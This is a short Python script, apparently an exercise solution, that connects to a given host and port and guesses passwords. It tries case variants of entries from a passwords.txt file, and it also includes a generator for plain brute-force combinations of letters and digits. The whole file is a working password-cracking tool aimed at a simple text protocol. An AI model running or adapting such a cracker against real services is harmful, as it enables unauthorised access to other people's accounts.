import argparse
import socket
import itertools
import string


def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('hostname', default='127.0.0.1', help='host name or IP address')
    arg_parser.add_argument('port', type=int)
    arg_parser.add_argument('--message', default='', help='message for sending to hostname')
    args = arg_parser.parse_args()

    with socket.socket() as client_socket:
        client_socket.connect((args.hostname, args.port))
        answer = 'Wrong password!'
        if args.message:
            client_socket.send(args.message.encode())
            answer = client_socket.recv(1024).decode()
        if answer == 'Wrong password!':
            for password in dictionary_based_brute_force_passwords():
                client_socket.send(password.encode())
                answer = client_socket.recv(1024).decode()
                if answer == 'Connection success!':
                    print(password)
                    break


def dictionary_based_brute_force_passwords():
    with open('passwords.txt') as f:
        for password in f:
            for combination in itertools.product(*((ch.upper(), ch.lower()) for ch in password.strip())):
                yield ''.join(combination)


def brute_force_passwords(available_characters=string.ascii_lowercase + string.digits):
    for r in range(1, len(available_characters)):
        for combination in itertools.product(available_characters, repeat=r):
            yield ''.join(combination)


if __name__ == '__main__':
    main()
